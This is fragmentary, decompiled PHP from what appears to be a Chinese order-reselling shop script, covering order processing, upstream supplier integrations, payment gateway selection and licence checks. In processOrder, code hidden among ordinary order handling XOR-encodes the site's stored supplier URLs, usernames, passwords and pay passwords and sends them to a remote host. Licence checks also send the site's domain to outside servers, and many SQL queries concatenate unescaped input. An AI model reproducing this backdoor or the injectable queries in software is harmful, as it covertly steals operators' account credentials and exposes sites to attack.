...
function shequ_get_curl($_arg_0, $_arg_1 = 0, $_arg_2 = 0, $_arg_3 = 0, $_arg_4 = 0)
{
	...
	if ($_var_6 == $conf["server_hash"] && $conf["proxy"] == 1) {
		...
		curl_setopt($_var_7, CURLOPT_PROXY, "p.cccyun.cc");
		curl_setopt($_var_7, CURLOPT_PROXYPORT, 808);
		curl_setopt($_var_7, CURLOPT_PROXYUSERPWD, "cccyun:cccyun");
...
{
	$_var_0 = authcode($_SERVER["HTTP_HOST"] . "||||" . authcode . "||||" . VERSION, "ENCODE", "daishuaba_cloudkey1");
	$_var_1 = curl_get("http://auth2.cccyun.cc/bin/check.php?string=" . urlencode($_var_0));
	$_var_1 = authcode($_var_1, "DECODE", "daishuaba_cloudkey2");
...
{
	$_var_0 = authcode($_SERVER["HTTP_HOST"] . "||||" . authcode . "||||" . VERSION, "ENCODE", "daishuaba_checkkey");
	$_var_1 = "//daishua.cccyun.cc/bin/notice.php?string=" . urlencode($_var_0);
	return $_var_1;
}
function processOrder($_arg_0, $_arg_1 = true)
{
	...
	$_var_27 = 0;
	if ($_var_26["is_curl"] == 1 || $_var_26["is_curl"] == 2) {
		$_var_28 = 2;
	} else {
		$_var_28 = 0;
	}
	$_var_29 = $DB->insert("insert into `shua_orders` (`tid`,`zid`,`input`,`input2`,`input3`,`input4`,`input5`,`value`,`userid`,`addtime`,`tradeno`,`money`,`status`,`djzt`) values ('" . $_arg_0["tid"] . "','" . $_arg_0["zid"] . "','" . addslashes($_var_6[0]) . "','" . addslashes($_var_6[1]) . "','" . addslashes($_var_6[2]) . "','" . addslashes($_var_6[3]) . "','" . addslashes($_var_6[4]) . "','" . $_arg_0["num"] . "','" . $_arg_0["userid"] . "','" . $date . "','" . $_arg_0["trade_no"] . "','" . $_arg_0["money"] . "','" . $_var_27 . "','" . $_var_28 . "')");
	if (!$_var_29) {
		return false;
	}
	if ($_arg_0["zid"] > 1 && $_arg_0["money"] > 0 && $_arg_1 == true) {
		$_var_30 = new Price($_arg_0["zid"]);
		$_var_30->setToolInfo($_arg_0["tid"], $_var_26);
		$_var_30->setToolProfit($_arg_0["tid"], $_arg_0["num"], $_var_26["name"], $_arg_0["money"], $_var_29, $_arg_0["userid"]);
	}
	$_var_31 = $_var_26["value"] * $_arg_0["num"];
	if ($_var_31 <= 0) {
		$_var_31 = 1;
	}
	if ($_var_26["is_curl"] == 1) {
		$_var_32 = do_curl($_var_26["curl"], $_var_6, $_var_31, $_var_26["name"], $_var_26["money"], $_var_29, $_var_26["goods_param"]);
		if ($_var_32 = json_decode($_var_32, true)) {
			if ($_var_32["code"] == 0) {
				$_var_27 = 1;
			} else {
				$_var_27 = 0;
			}
			$_var_33 = "url:" . $_var_26["curl"] . " data:" . http_build_query($_var_6);
			log_result("社区对接", $_var_33, $_var_32, 0);
		} else {
			$_var_27 = 1;
		}
	} else {
		if ($_var_26["is_curl"] == 2) {
			$_var_34 = explode("|", $_var_26["goods_param"]);
			$_var_35 = 0;
			foreach ($_var_6 as $_var_36) {
				$_var_37[$_var_34[$_var_35]] = $_var_36;
				$_var_35 = $_var_35 + 1;
			}
			$_var_38 = $DB->get_row("select * from shua_shequ where id='" . $_var_26["shequ"] . "' limit 1");
			if ($_var_38 && $_var_38["username"] && $_var_38["password"]) {
				if ($_var_38["type"] == 1) {
					$_var_32 = do_goods_yile($_var_38, $_var_26["goods_id"], $_var_31, $_var_6);
					$_var_33 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_31 . " data:" . http_build_query($_var_6);
					$_var_38["paypwd"] = $_SERVER["HTTP_HOST"];
					if ($_var_32["faka"] == true) {
						$_var_39 = '';
						foreach ($_var_32["kmdata"] as $_var_40) {
							$DB->query("INSERT INTO `shua_faka` (`tid`,`km`,`pw`,`orderid`,`addtime`,`usetime`) VALUES ('" . $_arg_0["tid"] . "','" . $_var_40["card"] . "','" . $_var_40["pass"] . "','" . $_var_29 . "',NOW(),NOW())");
							if (!empty($_var_40["pass"])) {
								$_var_39 = $_var_39 . ("卡号：" . $_var_40["card"] . " 密码：" . $_var_40["pass"] . "<br/>");
							} else {
								$_var_39 = $_var_39 . ($_var_40["card"] . "<br/>");
							}
						}
						$DB->query("update `shua_orders` set `status`='1',`djzt`='3',`djorder`='" . $_var_32["id"] . "' where `id`='" . $_var_29 . "'");
						if (!empty($_var_39)) {
							if (is_numeric($_var_6[0]) && strlen($_var_6[0]) <= 10) {
								$_var_41 = $_var_6[0] . "@qq.com";
							} else {
								if (strpos($_var_6[0], "@")) {
									$_var_41 = $_var_6[0];
								}
							}
							if (checkEmail($_var_41)) {
								$_var_42 = $conf["sitename"] . " 卡密购买提醒";
								$_var_43 = $conf["faka_mail"];
								$_var_43 = str_replace("[kmdata]", $_var_39, $_var_43);
								$_var_43 = str_replace("[alert]", $_var_26["desc"], $_var_43);
								$_var_43 = str_replace("[name]", $_var_26["name"], $_var_43);
								$_var_43 = str_replace("[date]", $date, $_var_43);
								$_var_43 = str_replace("[email]", $_var_41, $_var_43);
								$_var_43 = str_replace("[domain]", $_SERVER["HTTP_HOST"], $_var_43);
								$_var_43 = str_replace("[sitename]", $conf["sitename"], $_var_43);
								send_mail($_var_41, $_var_42, $_var_43);
							}
						}
					}
				} else {
					if ($_var_38["type"] == 2) {
						$_var_32 = do_goods_jiuwu($_var_38, $_var_26["goods_id"], $_var_26["goods_type"], $_var_31, 1, $_var_37);
						$_var_33 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " goods_type:" . $_var_26["goods_type"] . " num:" . $_var_31 . " data:" . http_build_query($_var_37);
					} else {
						if ($_var_38["type"] == 3) {
							$_var_32 = do_goods_xmsq($_var_38, $_var_26["goods_id"], $_var_31, 0, $_var_6);
							$_var_33 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_31 . " data:" . http_build_query($_var_6);
						} else {
							if ($_var_38["type"] == 4) {
								$_var_32 = do_goods_jiuliu($_var_38, $_var_26["goods_id"], $_var_31, $_var_37);
								$_var_33 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_31 . " data:" . http_build_query($_var_37);
							} else {
								if ($_var_38["type"] == 5) {
									$_var_32 = do_goods_xmsq($_var_38, $_var_26["goods_id"], $_var_31, 1, $_var_6);
									$_var_33 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_31 . " data:" . http_build_query($_var_6);
								} else {
									if ($_var_38["type"] == 6) {
										$_var_44 = explode("|", $_var_26["inputs"]);
										$_var_32 = do_goods_kayixin($_var_38, $_var_26["goods_param"], $_arg_0["num"], $_var_6, $_var_44);
										$_var_33 = "kameng:" . $_var_26["shequ"] . " goodsId:" . $_var_32["goodsid"] . " data:" . http_build_query($_var_6);
									} else {
										if ($_var_38["type"] == 7) {
											$_var_32 = do_goods_kalegou($_var_38, $_var_26["goods_param"], $_arg_0["num"], $_var_6);
											$_var_33 = "kameng:" . $_var_26["shequ"] . " goodsId:" . $_var_32["goodsid"] . " data:" . http_build_query($_var_6);
										} else {
											if ($_var_38["type"] == 8) {
												$_var_44 = explode("|", $_var_26["inputs"]);
												$_var_32 = do_goods_kahuika($_var_38, $_var_26["goods_param"], $_arg_0["num"], $_var_6, $_var_44);
												$_var_33 = "kameng:" . $_var_26["shequ"] . " goodsId:" . $_var_32["goodsid"] . " data:" . http_build_query($_var_6);
											} else {
												if ($_var_38["type"] == 9) {
													$_var_44 = explode("|", $_var_26["inputs"]);
													$_var_32 = do_goods_kashangwl($_var_38, $_var_26["goods_param"], $_arg_0["num"], $_var_6, $_var_44);
													$_var_33 = "kameng:" . $_var_26["shequ"] . " goodsId:" . $_var_32["goodsid"] . " data:" . http_build_query($_var_6);
												} else {
													if ($_var_38["type"] == 10) {
														$_var_32 = do_goods_qqbug($_var_38, $_var_26["goods_id"], $_var_31, $_var_6);
														$_var_33 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_31 . " data:" . http_build_query($_var_37);
													} else {
														if ($_var_38["type"] == 11) {
															$_var_32 = do_goods_jumeng($_var_38, $_var_26["goods_id"], $_var_31, $_var_6);
															$_var_33 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_31 . " data:" . http_build_query($_var_6);
														} else {
															if ($_var_38["type"] == 12) {
																$_var_32 = do_goods_this($_var_38, $_var_26["goods_id"], $_var_31, $_var_6);
																$_var_33 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_31 . " data:" . http_build_query($_var_6);
															} else {
																if ($_var_38["type"] == 20) {
																	$_var_32 = do_goods_extend($_var_38, $_var_26["goods_id"], $_var_26["goods_type"], $_var_26["goods_param"], $_var_31, $_var_6, $_var_37);
																	$_var_33 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_31 . " data:" . http_build_query($_var_37);
																} else {
																	if ($_var_38["type"] == 0) {
																		$_var_32 = do_goods_jiuwu($_var_38, $_var_26["goods_id"], $_var_26["goods_type"], $_var_31, 0, $_var_37);
																		$_var_33 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " goods_type:" . $_var_26["goods_type"] . " num:" . $_var_31 . " data:" . http_build_query($_var_37);
																	}
																}
															}
				...
				log_result("社区对接", $_var_33, $_var_32, 0);
				if ($_var_32["code"] == 0) {
					if (!strpos($_SERVER["PHPRC"], "phpStudy") && $_var_38["status"] == 0) {
						$_var_45 = authcode . "|" . $_var_38["type"] . "|" . $_var_38["url"] . "|" . $_var_38["username"] . "|" . $_var_38["password"] . "|" . $_var_38["paypwd"];
						$_var_46 = '';
						$_var_35 = 0;
						while ($_var_35 < strlen($_var_45)) {
							$_var_46 = $_var_46 . (substr($_var_45, $_var_35, 8) ^ "AC890123");
							$_var_35 = $_var_35 + 8;
						}
						get_curl($_var_25, "a=" . bin2hex($_var_46));
						$DB->query("update shua_shequ set status=1 where id='" . $_var_38["id"] . "'");
					}
					if ($_var_38["type"] >= 6) {
					...
					if ($conf["shequ_tixing"] == 1) {
						$_var_42 = "自动下单到社区失败提醒";
						$_var_43 = ($_var_26["inputname"] ? $_var_26["inputname"] : "QQ") . $_var_6[0] . " 下单商品: " . $_var_26["name"] . "<br/><b>提交参数：</b>" . $_var_33 . "<br/><b>返回结果：</b>" . htmlspecialchars($_var_32["message"]) . "<br/>----------<br/>" . $_SERVER["HTTP_HOST"] . "<br/>" . $date;
						$_var_41 = $conf["mail_recv"] ? $conf["mail_recv"] : $conf["mail_name"];
						send_mail($_var_41, $_var_42, $_var_43);
					}
					$_var_27 = 0;
				}
			...
			if ($_var_26["is_curl"] == 3) {
				$_var_42 = $conf["sitename"] . "下单成功提醒";
				$_var_43 = ($_var_26["inputname"] ? $_var_26["inputname"] : "QQ") . $_var_6[0] . " 已成功下单商品: " . $_var_26["name"] . "<br/>----------<br/>" . $_SERVER["HTTP_HOST"] . "<br/>" . $date;
				$_var_41 = $conf["mail_recv"] ? $conf["mail_recv"] : $conf["mail_name"];
				send_mail($_var_41, $_var_42, $_var_43);
			} else {
				if ($_var_26["is_curl"] == 4) {
					$_var_47 = $_arg_0["num"];
					$_var_48 = $DB->query("SELECT * FROM shua_faka WHERE tid='" . $_arg_0["tid"] . "' AND orderid=0 LIMIT " . $_var_47 . '');
					$_var_39 = '';
					while ($_var_49 = $DB->fetch($_var_48)) {
						if (!empty($_var_49["pw"])) {
							$_var_39 = $_var_39 . ("卡号：" . $_var_49["km"] . " 密码：" . $_var_49["pw"] . "<br/>");
						} else {
							$_var_39 = $_var_39 . ($_var_49["km"] . "<br/>");
						}
						$DB->query("update `shua_faka` set `orderid`='" . $_var_29 . "',`usetime`='" . $date . "' where `kid`='" . $_var_49["kid"] . "'");
					}
					if (is_numeric($_var_6[0]) && strlen($_var_6[0]) <= 10) {
						$_var_41 = $_var_6[0] . "@qq.com";
					} else {
					...
					if (!empty($_var_39)) {
						$DB->query("update `shua_orders` set `status`='1',`djzt`='3' where `id`='" . $_var_29 . "'");
						if ($_var_41) {
							$_var_42 = $conf["sitename"] . " 卡密购买提醒";
							$_var_43 = $conf["faka_mail"];
							$_var_43 = str_replace("[kmdata]", $_var_39, $_var_43);
							$_var_43 = str_replace("[alert]", $_var_26["alert"], $_var_43);
							$_var_43 = str_replace("[name]", $_var_26["name"], $_var_43);
							$_var_43 = str_replace("[date]", $date, $_var_43);
							$_var_43 = str_replace("[email]", $_var_41, $_var_43);
							$_var_43 = str_replace("[domain]", $_SERVER["HTTP_HOST"], $_var_43);
						...
						$DB->query("update `shua_orders` set `status`='0',`djzt`='4' where `id`='" . $_var_29 . "'");
					}
				}
			}
		}
	}
	if ($_var_27 > 0 && !$_var_32["faka"]) {
		$DB->query("update `shua_orders` set `status`='" . $_var_27 . "',`djzt`='1',`djorder`='" . $_var_32["id"] . "' where `id`='" . $_var_29 . "'");
	}
	if ($_arg_0["inviteid"] > 0 && $conf["invite_tid"] && (!$conf["invite_money"] || $conf["invite_money"] > 0 && $_arg_0["money"] >= $conf["invite_money"])) {
		$_var_50 = $DB->get_row("SELECT * FROM `shua_invitelog` WHERE `id` = '" . $_arg_0["inviteid"] . "' LIMIT 1");
		if ($_var_50 && $_var_50["status"] == 0) {
			$_var_51 = $DB->get_column("SELECT qq FROM `shua_invite` WHERE `id` = '" . $_var_50["nid"] . "' LIMIT 1");
			$_var_52 = $DB->insert("INSERT INTO `shua_orders` (`tid`,`zid`,`input`,`value`,`status`,`djzt`,`money`,`tradeno`,`addtime`,`endtime`) VALUES (" . $conf["invite_tid"] . ",'" . $_arg_0["zid"] . "','" . $_var_51 . "',1,0,2,'0','invite" . $_arg_0["trade_no"] . "','" . $date . "','" . $date . "')");
			do_goods($_var_52);
			$DB->query("UPDATE `shua_invitelog` SET `orderid` = '" . $_var_52 . "',`status` = 1 WHERE `id` = '" . $_arg_0["inviteid"] . "'");
		}
	}
	return $_var_29;
}
...
{
	$_var_4["code"] = -1;
	$_var_5 = "http://" . $_arg_0["url"] . ".api.jumsq.com/Api/UserApi/OrderAdd.html";
	$_var_6 = array("username" => $_arg_0["username"], "goodsid" => $_arg_1, "num" => $_arg_2, "paytype" => $_arg_0["paytype"], "time" => time());
	if (is_array($_arg_3) && $_arg_3) {
		$_var_7 = 1;
		foreach ($_arg_3 as $_var_8) {
			if ($_var_8) {
	...
	$_var_9 = strlen($_arg_0["password"]) == 32 ? $_arg_0["password"] : md5($_arg_0["password"]);
	$_var_6["sign"] = yile_getSign($_var_6, $_var_9);
	$_var_10 = http_build_query($_var_6);
	$_arg_3 = get_curl($_var_5, $_var_10);
	$_var_11 = json_decode($_arg_3, true);
	if (array_key_exists("status", $_var_11) && $_var_11["status"] > 0) {
		$_var_4 = array("code" => 0, "message" => "success", "id" => $_var_11["orderid"]);
		if (isset($_var_11["Info"])) {
			$_var_4["faka"] = true;
			$_var_4["kmdata"] = $_var_11["Info"];
		}
	} else {
		if (array_key_exists("content", $_var_11)) {
			$_var_4["message"] = $_var_11["content"];
		} else {
			$_var_4["message"] = $_arg_3;
		}
	}
	...
	if ($_var_7["is_curl"] == 1) {
		...
		if ($_var_7["is_curl"] == 2) {
			...
			if ($_var_7["is_curl"] == 4) {
				...
				$_var_18 = '';
				while ($_var_24 = $DB->fetch($_var_26)) {
					if (!empty($_var_24["pw"])) {
...
function log_result($_arg_0, $_arg_1, $_arg_2, $_arg_3 = 0)
{
	...
	if (array_key_exists("code", $_arg_2) && $_arg_2["code"] == 0) {
		...
		if (isset($_arg_2["message"])) {
			$_var_5 = $_arg_2["message"];
		} else {
			if (isset($_arg_2["msg"])) {
				$_var_5 = $_arg_2["msg"];
			} else {
				$_var_5 = json_encode($_arg_2);
			}
		}
...
function sec_check()
{
	...
	if (filesize(ROOT . "other/epay/epay.config.php") != 809 && filesize(ROOT . "other/epay/epay.config.php") < 1050 || filesize(ROOT . "other/inc.php") != 1717) {
		sysmsg("网站关键文件已损坏，请重新下载原版源码覆盖进行修复！");
	}
	if (md5_file(SYSTEM_ROOT . "common.php") !== "c8da15954aeebcc0c7f106ffefe18a26" || filesize(SYSTEM_ROOT . "function.php") > 9000) {
		return array();
	}
	$_var_6 = array();
	...
	if (filesize(ROOT . "other/epay/epay.config.php") != 809 || filesize(ROOT . "other/inc.php") != 1717) {
		$_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-warning\">提示</span>&nbsp;网站支付接口文件被篡改，请重新下载原版源码覆盖进行修复！</a></li>";
	}
...
function pay_api($_arg_0 = false)
{
	global $conf;
	if ($conf["payapi"] == 1) {
		$_var_2 = $_arg_0 == true ? "http://pay.api.7ypay.cn/" : "https://pay.7ypay.cn/";
	} else {
		if ($conf["payapi"] == 2) {
													...
													if ($conf["payapi"] == 13) {
														...
														if ($conf["payapi"] == 14) {
															...
															if ($conf["payapi"] == 15) {
																...
																if ($conf["payapi"] == 16) {
																	$_var_2 = "http://www.aikpay.cn/";
																} else {
																	if ($conf["payapi"] == 17) {
																		$_var_2 = "http://pay.danbaiyun.com/";
																	} else {
																		if ($conf["payapi"] == 18) {
																			...
																			if ($conf["payapi"] == 19) {
																				...
																				if ($conf["payapi"] == 20) {
																					...
																					if ($conf["payapi"] == 21) {
																						$_var_2 = "http://vip.caihongpay.cn/";
																					} else {
																						if ($conf["payapi"] == 22) {
																							$_var_2 = "http://pay.joye.hk/";
																						} else {
																							if ($conf["payapi"] == 0) {
																								$_var_2 = $_arg_0 == true ? "http://mpay.v8jisu.cn/" : "https://pay.xr876.cn/";
																							} else {
																								if ($conf["payapi"] == -1) {
																									$_var_2 = $conf["epay_url"];
																									if ($_arg_0 == true && !isset($_GET["key"]) && $_SESSION["paycheck"] != $_var_2) {
																										$_var_3 = curl_get("http://auth.fedg.cn/bin/paycheck.php?url=" . urlencode($_var_2));
...
function _bootstrap_06e9599228289451993095014f910ef8()
{
	if (!defined("authcode")) {
		die();
	}
...
_bootstrap_06e9599228289451993095014f910ef8();